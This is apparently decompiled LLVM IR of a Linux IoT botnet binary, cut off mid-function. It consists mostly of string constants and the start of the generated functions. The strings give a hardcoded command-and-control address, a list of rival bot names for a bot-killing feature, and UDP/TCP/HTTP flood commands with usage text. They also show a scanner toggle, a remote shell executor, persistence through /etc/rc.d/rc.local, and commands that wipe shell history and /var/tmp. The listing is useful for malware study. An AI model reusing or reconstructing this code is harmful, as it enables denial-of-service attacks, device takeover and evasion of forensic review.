@global_var_80580dd.319 = constant [5 x i8] c"i586\00"
@global_var_80580e2.320 = constant [8 x i8] c"jackmy*\00"
@global_var_80580ea.321 = constant [8 x i8] c"hackmy*\00"
@global_var_80580f2.322 = constant [5 x i8] c"arm*\00"
@global_var_80580f7.323 = constant [3 x i8] c"b1\00"
@global_var_80580fa.324 = constant [3 x i8] c"b2\00"
@global_var_80580fd.325 = constant [3 x i8] c"b3\00"
@global_var_8058100.326 = constant [3 x i8] c"b4\00"
@global_var_8058103.327 = constant [3 x i8] c"b5\00"
@global_var_8058106.328 = constant [3 x i8] c"b6\00"
@global_var_8058109.329 = constant [3 x i8] c"b7\00"
@global_var_805810c.330 = constant [3 x i8] c"b8\00"
@global_var_805810f.331 = constant [3 x i8] c"b9\00"
@global_var_8058112.332 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8058123.333 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805812c.334 = constant [10 x i8] c"dvrHelper\00"
@global_var_8058136.335 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805813e.336 = constant [5 x i8] c"FEUB\00"
@global_var_8058143.337 = constant [9 x i8] c"FTUdftui\00"
@global_var_805814c.338 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8058155.339 = constant [6 x i8] c"jhUOH\00"
@global_var_805815b.340 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_8058164.341 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_805816e.342 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8058178.343 = constant [10 x i8] c"lolmipsel\00"
@global_var_8058182.344 = constant [8 x i8] c"RYrydry\00"
@global_var_805818a.345 = constant [5 x i8] c"tel*\00"
@global_var_805818f.346 = constant [9 x i8] c"TwoFace*\00"
@global_var_8058198.347 = constant [9 x i8] c"UYyuyioy\00"
@global_var_80581a1.348 = constant [5 x i8] c"wget\00"
@global_var_80581a6.349 = constant [7 x i8] c"x86_64\00"
@global_var_80581ad.350 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_80581b6.351 = constant [5 x i8] c"xxb*\00"
@global_var_80581be.352 = constant i32 3276849
@global_var_80581c0.353 = constant i32 3342386
@global_var_80581c2.354 = constant i32 3407923
@global_var_80581c4.355 = constant i32 3473460
@global_var_80581c6.356 = constant i32 3538997
@global_var_80581c8.357 = constant i32 3604534
@global_var_80581ca.358 = constant i32 3670071
@global_var_80581cc.359 = constant i32 3735608
@global_var_80581ce.360 = constant i32 808517689
@global_var_80581d0.361 = constant [3 x i8] c"10\00"
@global_var_80581d3.362 = constant [3 x i8] c"11\00"
@global_var_80581d6.363 = constant [3 x i8] c"12\00"
@global_var_80581d9.364 = constant [3 x i8] c"13\00"
@global_var_80581dc.365 = constant [3 x i8] c"14\00"
@global_var_80581df.366 = constant [3 x i8] c"15\00"
@global_var_80581e2.367 = constant [3 x i8] c"16\00"
@global_var_80581e5.368 = constant [3 x i8] c"17\00"
@global_var_80581e8.369 = constant [3 x i8] c"18\00"
@global_var_80581eb.370 = constant [3 x i8] c"19\00"
@global_var_80581ee.371 = constant [3 x i8] c"20\00"
@global_var_80581f1.372 = constant [6 x i8] c"hackz\00"
@global_var_80581f7.373 = constant [5 x i8] c"bin*\00"
@global_var_80581fc.374 = constant [5 x i8] c"gtop\00"
@global_var_8058201.375 = constant [5 x i8] c"ftp*\00"
@global_var_8058206.376 = constant [6 x i8] c"tftp*\00"
@global_var_805820c.377 = constant [7 x i8] c"botnet\00"
@global_var_8058213.378 = constant [8 x i8] c"swatnet\00"
@global_var_805821b.379 = constant [8 x i8] c"ballpit\00"
@global_var_8058223.380 = constant [8 x i8] c"fucknet\00"
@global_var_805822b.381 = constant [9 x i8] c"cracknet\00"
@global_var_8058234.382 = constant [8 x i8] c"weednet\00"
@global_var_805823c.383 = constant [7 x i8] c"gaynet\00"
@global_var_8058243.384 = constant [9 x i8] c"queernet\00"
@global_var_805824c.385 = constant [8 x i8] c"ballnet\00"
@global_var_8058254.386 = constant [5 x i8] c"unet\00"
@global_var_8058259.387 = constant [7 x i8] c"yougay\00"
@global_var_8058260.388 = constant [7 x i8] c"sttftp\00"
@global_var_8058267.389 = constant [7 x i8] c"sstftp\00"
@global_var_805826e.390 = constant [7 x i8] c"sbtftp\00"
@global_var_8058275.391 = constant [6 x i8] c"btftp\00"
@global_var_805827b.392 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_8058284.393 = constant [6 x i8] c"bruv*\00"
@global_var_805828a.394 = constant [5 x i8] c"IoT*\00"
@global_var_805828f.395 = constant [16 x i8] c"208.67.1.179:23\00"
@global_var_805c040.396 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580c0.313, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80580c5.314, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580cc.315, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580d0.316, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580d4.317, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580d9.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580dd.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580dd.319, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80580e2.320, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80580ea.321, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580f2.322, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80580f7.323, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80580fa.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80580fd.325, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058100.326, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058103.327, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058106.328, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058109.329, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805810c.330, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805810f.331, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8058112.332, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058123.333, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805812c.334, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058136.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805813e.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058143.337, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805814c.338, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058155.339, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805815b.340, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058164.341, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805816e.342, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058178.343, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80580c0.313, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80580c5.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058182.344, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805818a.345, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805818f.346, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058198.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80581a1.348, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80581a6.349, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80581ad.350, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80581b6.351, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581bb.15, i32 0, i32 0), i8* bitcast (i32* @global_var_80581be.352 to i8*), i8* bitcast (i32* @global_var_80581c0.353 to i8*), i8* bitcast (i32* @global_var_80581c2.354 to i8*), i8* bitcast (i32* @global_var_80581c4.355 to i8*), i8* bitcast (i32* @global_var_80581c6.356 to i8*), i8* bitcast (i32* @global_var_80581c8.357 to i8*), i8* bitcast (i32* @global_var_80581ca.358 to i8*), i8* bitcast (i32* @global_var_80581cc.359 to i8*), i8* bitcast (i32* @global_var_80581ce.360 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581d0.361, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581d3.362, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581d6.363, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581d9.364, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581dc.365, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581df.366, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581e2.367, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581e5.368, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581e8.369, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581eb.370, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80581ee.371, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80581f1.372, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80581f7.373, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80581fc.374, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058201.375, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058206.376, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805820c.377, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058213.378, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805821b.379, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058223.380, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805822b.381, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058234.382, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805823c.383, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058243.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805824c.385, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058254.386, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058259.387, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058260.388, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058267.389, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805826e.390, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058275.391, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805827b.392, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058284.393, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805828a.394, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805828f.395, i32 0, i32 0)]
@global_var_8059639.397 = constant i32 1768423458
@global_var_805963b.398 = constant [22 x i8] c"history -c;history -w\00"
@global_var_8059651.399 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_805966f.400 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_8059684.401 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_80596c4.402 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_8059704.403 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_8059794.404 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_80597cc.405 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_80597ec.406 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8059804.407 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_805985c.408 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_8059684.401, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_80596c4.402, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8059704.403, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8059794.404, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_80597cc.405, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_80597ec.406, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8059804.407, i32 0, i32 0)]
@global_var_8059890.412 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_80598d0.413 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_8059684.401, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_80596c4.402, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8059704.403, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8059794.404, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_80597cc.405, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_80597ec.406, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8059804.407, i32 0, i32 0)]
@global_var_80598ec.414 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_805992c.415 = constant [6 x i8] c"PONG!\00"
@global_var_8059932.416 = constant [6 x i8] c"TABLE\00"
@global_var_8059938.417 = constant [3 x i8] c"%d\00"
@global_var_805993b.418 = constant [8 x i8] c"SCANNER\00"
@global_var_8059943.419 = constant [4 x i8] c"OFF\00"
@global_var_80627b0.420 = local_unnamed_addr global i32 0
@global_var_8059947.421 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_8059958.422 = constant [3 x i8] c"ON\00"
@global_var_805995b.423 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_8059975.424 = constant [8 x i8] c"REMOVER\00"
@global_var_805997d.425 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_805999a.426 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_80599a6.427 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_80599b7.428 = constant [4 x i8] c"UDP\00"
@global_var_80599bc.429 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_8059a2d.430 = constant [4 x i8] c"TCP\00"
@global_var_8059a34.431 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_8059aee.432 = constant [5 x i8] c"HTTP\00"
@global_var_8059af3.433 = constant [10 x i8] c"HTTPFLOOD\00"
@global_var_8059afd.434 = constant [4 x i8] c"CNC\00"
@global_var_8059b01.435 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_8059b1c.436 = constant [4 x i8] c"STD\00"
@global_var_8059b20.437 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_8059b3b.438 = constant [9 x i8] c"KILLATTK\00"
@global_var_8059b44.439 = constant [11 x i8] c"Killed %d.\00"
@global_var_8059b4f.440 = constant [13 x i8] c"None Killed.\00"
@global_var_8059b5c.441 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_805c19c.442 = local_unnamed_addr global i32 -1
@global_var_805c198.443 = global [16 x i8]* @global_var_805828f.395
@global_var_8059b66.444 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8059b6e.445 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8059b7e.446 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8059b89.448 = constant [9 x i8] c"TOXICNET\00"
@global_var_8059b92.449 = constant i32 1952788224
@global_var_8059b93.450 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1697579122
@global_var_8059ba8.452 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8059bb7.454 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8059bbf.455 = constant i32 1868955745
@global_var_8059bc1.456 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8059bce.457 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_8059bda.458 = constant [5 x i8] c"PONG\00"
@global_var_8059bdf.459 = constant [4 x i8] c"DUP\00"
@global_var_8059be3.460 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8059bf7.461 = constant [3 x i8] c"SH\00"
@global_var_8059bfa.462 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8059c02.463 = constant [3 x i8] c"%s\00"
@global_var_8059c05.464 = constant i32 32
@global_var_8062770.465 = local_unnamed_addr global i32 0
@global_var_805c278 = external local_unnamed_addr global i32
@global_var_8062780.471 = global i32 0
@global_var_805c2b4.472 = global i32 0
@global_var_8060544.473 = local_unnamed_addr global i32 0
@global_var_8060548.474 = local_unnamed_addr global i32 0
@global_var_805c2cc.475 = local_unnamed_addr global i32 2
@global_var_805c29c.476 = global i32 0
@global_var_805c298.477 = global i32* bitcast (i16* @global_var_805c2e0.468 to i32*)
@global_var_805a220.478 = constant i32 0
@global_var_805a238.479 = constant [6 x i8] c"(nil)\00"
@global_var_805a23e.480 = constant [7 x i8] c"(null)\00"
@global_var_805a245.481 = constant i32 2949163
@global_var_805a2b2.483 = constant i32 327688
@global_var_805a2aa.484 = constant [8 x i8] c" +0-#'I\00"
@global_var_805a258.485 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805a295.486 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805a28b.487 = constant i32 117506048
@global_var_805a27c.488 = constant i32 331776
@global_var_805a300.489 = constant [8 x i8] c"Success\00"
@global_var_805a2d6.490 = constant [15 x i8] c"Unknown error \00"
@global_var_805b200.491 = constant i32 65536
@global_var_805c4e0.492 = local_unnamed_addr global i32* @global_var_805b200.491
@global_var_8062560.493 = global i32 0
@global_var_8062564.494 = global i32 0
@global_var_8062580.495 = global i32 0
@global_var_806274c.496 = global i32 0
@global_var_805c4e8.497 = global i32 0
@global_var_8062bd4.498 = local_unnamed_addr global i32 0
@global_var_8062bc8.499 = global i32 0
@global_var_80627c0.500 = global i32 0
@global_var_805c3d0.501 = global i32 0
@global_var_806286c.503 = global i32 0
@global_var_8062870.504 = local_unnamed_addr global i32 0
@global_var_8062874.505 = global i32 0
@global_var_8062880.506 = local_unnamed_addr global i32 0
@global_var_8062b74.507 = global i32 0
@global_var_8062b9c.508 = local_unnamed_addr global i32 0
@global_var_8062b8c.509 = local_unnamed_addr global i32 0
@global_var_8062b90.510 = local_unnamed_addr global i32 0
@global_var_8062b94.511 = local_unnamed_addr global i32 0
@global_var_8062bb0.512 = local_unnamed_addr global i32 0
@global_var_8062b98.513 = local_unnamed_addr global i32 0
@global_var_8062ba4.514 = local_unnamed_addr global i32 0
@global_var_8062ba8.515 = local_unnamed_addr global i32 0
@global_var_8062bb4.516 = local_unnamed_addr global i32 0
@global_var_8062b88.517 = local_unnamed_addr global i32 0
@global_var_8062b84.519 = local_unnamed_addr global i32 0
@global_var_8062bac.520 = local_unnamed_addr global i32 0
@global_var_806287c.521 = local_unnamed_addr global i32 0
@global_var_805c3e8.522 = global i32 0
@global_var_805c400.524 = global i32 0
@global_var_805c418 = external global i32
@global_var_805c444.526 = global i32 -1726662223
@global_var_805c420.527 = local_unnamed_addr global i32* @global_var_805c444.526
@global_var_805c41c.528 = global i32* @global_var_805c444.526
@global_var_805ae74.529 = constant i32 0
@global_var_805ae60.530 = constant i32 0
@global_var_805ae88.531 = constant [3 x i8] c"-c\00"
@global_var_805ae90.532 = constant [3 x i8] c"sh\00"
@global_var_805ae8b.533 = constant [8 x i8] c"/bin/sh\00"
@global_var_805c4c0.534 = global i32 0
@global_var_8062764.535 = local_unnamed_addr global i32 0
@global_var_806276c.536 = local_unnamed_addr global i32 0
@global_var_805c000.538 = global i32 -1
@global_var_80551a3.539 = constant i32 -294069
@global_var_8062774.540 = local_unnamed_addr global i32 0
@global_var_8062778.541 = local_unnamed_addr global i32 0
@global_var_805b0ec.542 = constant [10 x i8] c"/dev/null\00"
@global_var_8062768.544 = local_unnamed_addr global i32 0
@global_var_805538b.546 = constant i32 1928542531
@global_var_80553af.547 = constant i32 1928542531
@global_var_80627a4.548 = local_unnamed_addr global i32 0
@global_var_8062784.549 = global i32 0
@global_var_805b410.551 = constant [4 x i8] c"inf\00"
@global_var_805b413.556 = constant i32 1179535616
@global_var_805b420.557 = constant i32 2883630
@global_var_8062bd8.561 = local_unnamed_addr global i32 0
@global_var_805b4dc.562 = constant i32 1697579054
@global_var_805b510.563 = constant i32 1868824690
@global_var_805b4de.564 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805b4ef.565 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805b507.566 = constant [11 x i8] c"nameserver\00"
@global_var_805b512.567 = constant [7 x i8] c"domain\00"
@global_var_805b519.568 = constant [7 x i8] c"search\00"
@global_var_8062bb8.569 = global i32 0
@global_var_8062bdc.570 = local_unnamed_addr global i32 0
@global_var_8062be0.571 = local_unnamed_addr global i32 0
@global_var_805b534.572 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805b531.574 = constant [3 x i8] c"%x\00"
@global_var_805b545.575 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805b550.576 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805c500.1 = local_unnamed_addr global i8 0
@global_var_8060540.13 = external local_unnamed_addr global i8*
@global_var_805c539.40 = local_unnamed_addr global i8 0
@global_var_805c53a.41 = local_unnamed_addr global i8 0
@global_var_805c530.447 = external global i8*
@2 = internal constant [2 x i8] c"/\00"
@global_var_8059bb5.453 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_805c2e0.468 = global i16 288
@global_var_805c330.469 = local_unnamed_addr global i16 272
@global_var_805a2ca.482 = external constant i8*
@global_var_8062840.502 = global i8 0
@global_var_8062ba0.518 = local_unnamed_addr global i8 0
@global_var_8062760.523 = local_unnamed_addr global i8 0
@global_var_806277c.543 = local_unnamed_addr global i8 0
@global_var_805b440.554 = constant x86_fp80* null
@global_var_8062788.558 = external global i8*
@global_var_80627a0.559 = local_unnamed_addr global i64 0
@global_var_805c4e4.560 = local_unnamed_addr global i16 1
@global_var_8059ba6.451 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 81783
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805c500.1, align 256
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805c024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805c024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805c024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805c500.1, align 256
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805c024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805c500.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805b564.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_805c010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
